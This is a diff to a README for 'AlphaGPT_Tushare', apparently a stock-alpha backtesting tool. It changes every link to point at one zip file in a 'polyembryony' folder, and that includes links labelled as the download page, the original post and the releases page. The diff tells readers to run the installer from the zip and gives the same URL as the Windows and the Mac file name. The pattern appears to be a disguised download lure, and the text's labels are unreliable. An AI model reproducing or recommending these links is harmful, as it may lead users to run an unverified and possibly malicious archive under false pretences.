@@ -6,15 +6,15 @@ Welcome to AlphaGPT_Tushare! This application helps users generate and backtest 
 
 ## 🔗 Download AlphaGPT_Tushare
 
-[![Download Now](https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip%20Now-AlphaGPT_Tushare-brightgreen)](https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip)
+[![Download Now](https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip%20Now-AlphaGPT_Tushare-brightgreen)](https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip)
 
 ## 📥 Download & Install
 
 To download AlphaGPT_Tushare, follow these simple steps:
 
-1. Click this link to **[visit the download page](https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip)**.
+1. Click this link to **[visit the download page](https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip)**.
 2. Look for the latest release. It will have a version number, like `v1.0`.
-3. You will see several files. Choose the appropriate file for your operating system. If you are unsure, we recommend using the file named `https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip` for Windows or `https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip` for Mac.
+3. You will see several files. Choose the appropriate file for your operating system. If you are unsure, we recommend using the file named `https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip` for Windows or `https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip` for Mac.
 4. Click on the file to start the download.
 5. After the download completes, locate the file in your Downloads folder.
 6. Double-click the file to run the installer.
@@ -57,11 +57,11 @@ If you have questions or need assistance, please check our GitHub Issues page. Y
 
 ## 🌟 Acknowledgments
 
-This project was inspired by contributions from the community and the great minds at JoinQuant. For more details, you can view the original post [here](https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip).
+This project was inspired by contributions from the community and the great minds at JoinQuant. For more details, you can view the original post [here](https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip).
 
 ## 📢 Stay Updated
 
-Make sure to check the releases page regularly for updates and new features: [Visit Releases Page](https://raw.githubusercontent.com/Safiyah-Aqilah/AlphaGPT_Tushare/main/polyembryony/GP-Alpha-Tushare-v2.8-beta.5.zip).
+Make sure to check the releases page regularly for updates and new features: [Visit Releases Page](https://github.com/Safiyah-Aqilah/AlphaGPT_Tushare/raw/refs/heads/main/polyembryony/Tushare_GP_Alpha_3.2.zip).
 
 ## 🎉 Conclusion
 
